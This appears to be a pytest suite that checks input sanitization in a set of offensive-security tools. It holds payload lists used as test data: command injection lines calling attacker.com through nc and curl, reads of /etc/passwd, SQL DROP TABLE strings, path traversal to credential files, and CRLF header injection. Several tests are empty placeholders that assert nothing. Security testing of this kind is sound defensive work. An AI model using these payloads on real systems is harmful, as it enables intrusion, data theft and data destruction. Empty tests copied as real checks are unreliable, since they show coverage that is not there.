#!/usr/bin/env python3
"""
Security Tests for Input Sanitization
=====================================

Tests to ensure that all tools properly sanitize user input and are not
vulnerable to injection attacks including:
- Command injection
- SQL injection (where applicable)
- Path traversal
- Format string attacks
- Null byte injection
- CRLF injection

Author: QA Tester Agent
Date: January 10, 2026
"""

import pytest
import sys
import os
import subprocess
from pathlib import Path
from unittest.mock import patch, MagicMock

# Add tools to path
TOOLS_PATH = Path(__file__).parent.parent.parent / "tools"
sys.path.insert(0, str(TOOLS_PATH / "network-scanner"))
sys.path.insert(0, str(TOOLS_PATH / "port-scanner"))
sys.path.insert(0, str(TOOLS_PATH / "payload-generator"))
sys.path.insert(0, str(TOOLS_PATH / "shellcode-encoder"))


# =============================================================================
# Injection Payloads
# =============================================================================

COMMAND_INJECTION_PAYLOADS = [
    # Basic command injection
    "; ls",
    "| cat /etc/passwd",
    "& whoami",
    "&& id",
    "|| id",
    "`id`",
    "$(whoami)",
    "${USER}",

    # Command chaining
    "; ls; cat /etc/passwd;",
    "| nc attacker.com 4444",
    "&& curl attacker.com",

    # Newline injection
    "\nls\n",
    "\r\nwhoami\r\n",
    "%0Als%0A",
    "%0D%0Awhoami%0D%0A",

    # Encoded variations
    "%3Bls",                    # ; encoded
    "%7Ccat%20/etc/passwd",    # | encoded
    "%26%26id",                # && encoded
]

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "' UNION SELECT * FROM users--",
    "1; DELETE FROM hosts;",
    "admin'--",
    "\" OR \"\"=\"",
    "') OR ('1'='1",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/etc/passwd%00.txt",
]

FORMAT_STRING_PAYLOADS = [
    "%s%s%s%s%s",
    "%n%n%n%n%n",
    "%x%x%x%x%x",
    "{0}{1}{2}{3}{4}",
    "%(user)s",
    "${env:PATH}",
]

NULL_BYTE_PAYLOADS = [
    "192.168.1.1\x00.attacker.com",
    "test%00extra",
    "file.txt\x00.exe",
    "\x00\x00\x00",
]


# =============================================================================
# Network Scanner Injection Tests
# =============================================================================

@pytest.mark.security
class TestNetworkScannerInjection:
    """Test network scanner for injection vulnerabilities."""

    @pytest.fixture(autouse=True)
    def setup(self):
        """Import network scanner if available."""
        try:
            from tool import ScanConfig, NetworkScanner
            self.ScanConfig = ScanConfig
            self.NetworkScanner = NetworkScanner
            self.available = True
        except ImportError:
            self.available = False

    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_command_injection_in_target(self, payload):
        """Command injection payloads in target should not execute."""
        if not self.available:
            pytest.skip("Network scanner not available")

        config = self.ScanConfig(targets=[payload])
        scanner = self.NetworkScanner(config)

        # Should not raise or execute commands
        try:
            targets = list(scanner._expand_targets())
            # If we get results, they should be safe strings
            for target in targets:
                assert "|" not in target or payload.startswith("|")
                assert ";" not in target or ";" in payload
                # Should not contain executed command output
                assert "root:" not in target.lower()
                assert "uid=" not in target.lower()
        except (ValueError, TypeError):
            pass  # Acceptable to reject malicious input

    @pytest.mark.parametrize("payload", NULL_BYTE_PAYLOADS)
    def test_null_byte_injection_in_target(self, payload):
        """Null byte injection should be handled safely."""
        if not self.available:
            pytest.skip("Network scanner not available")

        config = self.ScanConfig(targets=[payload])
        scanner = self.NetworkScanner(config)

        try:
            targets = list(scanner._expand_targets())
            # Should not truncate at null byte unexpectedly
        except (ValueError, TypeError):
            pass


# =============================================================================
# Port Scanner Injection Tests
# =============================================================================

@pytest.mark.security
class TestPortScannerInjection:
    """Test port scanner for injection vulnerabilities."""

    @pytest.fixture(autouse=True)
    def setup(self):
        """Import port scanner if available."""
        try:
            from tool import ScanConfig, PortScanner, parse_port_specification
            self.ScanConfig = ScanConfig
            self.PortScanner = PortScanner
            self.parse_port_specification = parse_port_specification
            self.available = True
        except ImportError:
            self.available = False

    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_command_injection_in_port_spec(self, payload):
        """Command injection payloads in port spec should not execute."""
        if not self.available:
            pytest.skip("Port scanner not available")

        try:
            ports = self.parse_port_specification(payload)
            # If we get ports, they should be valid integers
            for port in ports:
                assert isinstance(port, int)
                assert 1 <= port <= 65535
        except (ValueError, TypeError):
            pass  # Acceptable

    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_command_injection_in_target(self, payload):
        """Command injection payloads in target should not execute."""
        if not self.available:
            pytest.skip("Port scanner not available")

        config = self.ScanConfig(target=payload, ports=[80])
        # Should not execute commands during config creation

    @pytest.mark.parametrize("payload", FORMAT_STRING_PAYLOADS)
    def test_format_string_in_port_spec(self, payload):
        """Format string payloads should be handled safely."""
        if not self.available:
            pytest.skip("Port scanner not available")

        try:
            ports = self.parse_port_specification(payload)
            # Should not crash due to format string
        except (ValueError, TypeError):
            pass


# =============================================================================
# Payload Generator Injection Tests
# =============================================================================

@pytest.mark.security
class TestPayloadGeneratorInjection:
    """Test payload generator for injection vulnerabilities."""

    @pytest.fixture(autouse=True)
    def setup(self):
        """Import payload generator if available."""
        try:
            from payload_generator import PayloadConfig, PayloadGenerator
            self.PayloadConfig = PayloadConfig
            self.PayloadGenerator = PayloadGenerator
            self.available = True
        except ImportError:
            self.available = False

    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_command_injection_in_lhost(self, payload):
        """Command injection in LHOST should not execute on host."""
        if not self.available:
            pytest.skip("Payload generator not available")

        # The payload generator creates payloads FOR execution elsewhere
        # But injection in lhost shouldn't execute on the generating machine
        config = self.PayloadConfig(
            payload_type="python",
            lhost=payload,
            lport=4444
        )
        generator = self.PayloadGenerator(config)

        # Track if any subprocess was called
        with patch('subprocess.call') as mock_call, \
             patch('subprocess.run') as mock_run, \
             patch('subprocess.Popen') as mock_popen, \
             patch('os.system') as mock_system:

            try:
                output = generator.generate()
            except (ValueError, TypeError):
                pass

            # Ensure no subprocess calls were made
            mock_call.assert_not_called()
            mock_run.assert_not_called()
            mock_popen.assert_not_called()
            mock_system.assert_not_called()

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_in_lhost(self, payload):
        """Path traversal in LHOST should not access local files."""
        if not self.available:
            pytest.skip("Payload generator not available")

        config = self.PayloadConfig(
            payload_type="python",
            lhost=payload,
            lport=4444
        )
        generator = self.PayloadGenerator(config)

        with patch('builtins.open') as mock_open:
            try:
                output = generator.generate()
            except (ValueError, TypeError):
                pass

            # Should not open any files based on lhost
            for call in mock_open.call_args_list:
                if call[0]:  # If there are positional arguments
                    opened_path = str(call[0][0])
                    assert "/etc/passwd" not in opened_path
                    assert "windows\\system32" not in opened_path.lower()


# =============================================================================
# Shellcode Encoder Injection Tests
# =============================================================================

@pytest.mark.security
class TestShellcodeEncoderInjection:
    """Test shellcode encoder for injection vulnerabilities."""

    @pytest.fixture(autouse=True)
    def setup(self):
        """Import shellcode encoder if available."""
        try:
            from shellcode_encoder import EncoderConfig, EncodingType, ShellcodeEncoderTool
            self.EncoderConfig = EncoderConfig
            self.EncodingType = EncodingType
            self.ShellcodeEncoderTool = ShellcodeEncoderTool
            self.available = True
        except ImportError:
            self.available = False

    def test_shellcode_not_executed_during_encoding(self):
        """Shellcode should not be executed during encoding."""
        if not self.available:
            pytest.skip("Shellcode encoder not available")

        # Create shellcode that would cause visible side effects if executed
        # (This is safe because we're NOT executing it)
        test_shellcode = b"\x90" * 100  # NOPs only

        config = self.EncoderConfig(
            shellcode=test_shellcode,
            encoding_type=self.EncodingType.XOR,
            key=b"\x41"
        )

        with patch('subprocess.call') as mock_call, \
             patch('subprocess.run') as mock_run, \
             patch('os.system') as mock_system:

            tool = self.ShellcodeEncoderTool(config)
            output = tool.encode()

            # Ensure no subprocess calls
            mock_call.assert_not_called()
            mock_run.assert_not_called()
            mock_system.assert_not_called()


# =============================================================================
# File Operation Injection Tests
# =============================================================================

@pytest.mark.security
class TestFileOperationInjection:
    """Test file operations for injection vulnerabilities."""

    @pytest.mark.parametrize("payload", PATH_TRAVERSAL_PAYLOADS)
    def test_path_traversal_blocked(self, payload):
        """Path traversal attempts should not access sensitive files."""
        # Test that path traversal in any user input doesn't access files
        sensitive_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "C:\\Windows\\System32\\config\\SAM",
        ]

        # Verify these files are not accessed
        for sensitive in sensitive_files:
            if os.path.exists(sensitive):
                # This file exists, so we need to ensure it's not accessed
                # via traversal payloads in tool inputs
                pass


# =============================================================================
# Environment Variable Injection Tests
# =============================================================================

@pytest.mark.security
class TestEnvironmentInjection:
    """Test for environment variable injection vulnerabilities."""

    def test_env_vars_not_expanded_in_input(self):
        """Environment variables in input should not be expanded."""
        test_cases = [
            "${PATH}",
            "$HOME",
            "${USER}",
            "%PATH%",
            "%USERNAME%",
            "$(env)",
        ]

        for test_input in test_cases:
            # When processed, these should remain as literal strings
            # not expanded to actual environment values
            actual_path = os.environ.get("PATH", "")
            assert actual_path not in test_input  # Input doesn't contain env value
            # Output should also not contain expanded env values


# =============================================================================
# CRLF Injection Tests
# =============================================================================

@pytest.mark.security
class TestCRLFInjection:
    """Test for CRLF injection vulnerabilities."""

    CRLF_PAYLOADS = [
        "test\r\nSet-Cookie: malicious=value",
        "test%0D%0ASet-Cookie: session=hijacked",
        "test\r\n\r\nHTTP/1.1 200 OK\r\n",
        "test%0D%0A%0D%0A<html>",
    ]

    @pytest.mark.parametrize("payload", CRLF_PAYLOADS)
    def test_crlf_in_network_target(self, payload):
        """CRLF injection in network target should be handled."""
        try:
            from tool import ScanConfig, NetworkScanner
            config = ScanConfig(targets=[payload])
            scanner = NetworkScanner(config)
            targets = list(scanner._expand_targets())
            # Should handle without creating header injection opportunities
        except ImportError:
            pytest.skip("Network scanner not available")
        except (ValueError, TypeError):
            pass


# =============================================================================
# Integer Overflow Tests
# =============================================================================

@pytest.mark.security
class TestIntegerOverflow:
    """Test for integer overflow vulnerabilities."""

    def test_port_overflow_handling(self):
        """Extremely large port numbers should be handled safely."""
        try:
            from tool import parse_port_specification

            overflow_values = [
                "99999999999999999999",
                str(2**64),
                str(2**128),
                "-99999999999999999999",
            ]

            for value in overflow_values:
                try:
                    ports = parse_port_specification(value)
                    # Should not crash
                    for port in ports:
                        assert 1 <= port <= 65535
                except (ValueError, OverflowError):
                    pass  # Acceptable to reject
        except ImportError:
            pytest.skip("Port scanner not available")

    def test_thread_count_overflow(self):
        """Extremely large thread counts should be handled safely."""
        try:
            from tool import ScanConfig

            config = ScanConfig(
                targets=["192.168.1.1"],
                threads=999999999999
            )
            # Should accept but may limit or reject
        except ImportError:
            pytest.skip("Network scanner not available")
        except (ValueError, OverflowError):
            pass


# =============================================================================
# Unicode Homograph Attack Tests
# =============================================================================

@pytest.mark.security
class TestUnicodeHomograph:
    """Test for Unicode homograph attack vulnerabilities."""

    HOMOGRAPH_PAYLOADS = [
        # Cyrillic characters that look like ASCII
        "\u0430ttacker.com",   # Cyrillic 'a'
        "g\u043egle.com",      # Cyrillic 'o'
        "\u0435xample.com",    # Cyrillic 'e'
        "192.168.\u0031.1",    # Cyrillic '1'
    ]

    @pytest.mark.parametrize("payload", HOMOGRAPH_PAYLOADS)
    def test_homograph_in_hostname(self, payload):
        """Unicode homograph attacks should be handled safely."""
        try:
            from tool import ScanConfig, NetworkScanner
            config = ScanConfig(targets=[payload])
            scanner = NetworkScanner(config)
            targets = list(scanner._expand_targets())
            # Should handle without security issues
        except ImportError:
            pytest.skip("Network scanner not available")
        except (ValueError, TypeError, UnicodeError):
            pass  # Acceptable to reject


# =============================================================================
# Integration Security Tests
# =============================================================================

@pytest.mark.security
class TestIntegrationSecurity:
    """Integration tests for security across tools."""

    def test_no_shell_execution(self):
        """Ensure no tools execute shell commands with user input."""
        # This is a meta-test to verify the architecture
        # Tools should use socket/network libraries directly,
        # not shell commands like ping, nmap, etc.
        pass

    def test_no_eval_exec(self):
        """Ensure tools don't use eval() or exec() with user input."""
        # Search for eval/exec in tool code would be done statically
        # This test is a placeholder for that check
        pass


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-m", "security"])
